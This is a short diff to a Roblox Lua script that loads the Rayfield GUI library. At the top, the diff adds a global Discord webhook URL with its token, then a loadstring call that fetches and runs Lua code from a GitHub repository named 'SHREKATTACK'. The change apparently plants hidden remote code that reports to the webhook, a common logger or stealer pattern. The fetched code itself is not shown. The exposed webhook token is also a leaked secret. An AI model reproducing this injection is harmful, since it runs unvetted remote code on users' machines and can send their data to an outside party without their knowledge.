@@ -1,3 +1,6 @@
+_G.webhooksdiscord = "https://canary.discord.com/api/webhooks/1442081799181172867/Mm-iowlOPvR4-_jgJP6JpvYXBMkJ8dS7wBclU6hL3z3upagBv2GxU5QzCi9c_W_HbdFW"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
+
 -- โหลด Rayfield GUI
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local player = game.Players.LocalPlayer
